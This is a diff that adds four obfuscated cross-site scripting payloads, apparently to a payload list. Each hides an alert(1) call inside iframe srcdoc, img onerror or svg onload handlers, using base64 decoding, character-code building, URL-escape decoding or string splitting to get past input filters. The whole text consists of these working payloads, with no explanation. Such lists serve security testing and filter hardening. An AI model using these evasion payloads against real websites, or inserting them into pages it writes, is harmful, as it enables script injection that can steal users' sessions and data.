@@ -1,0 +1,4 @@
+<iframe srcdoc="<img src=x onerror=setTimeout(atob('YWxlcnQoMSk='),0)>"></iframe>
+<iframe srcdoc="<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>"></iframe>
+<svg onload=setTimeout(eval('unescape(`%61%6c%65%72%74(1)`)'),0)>
+<iframe srcdoc="<img src=x onerror=setTimeout(`al`+`ert(1)`,0)>"></iframe>
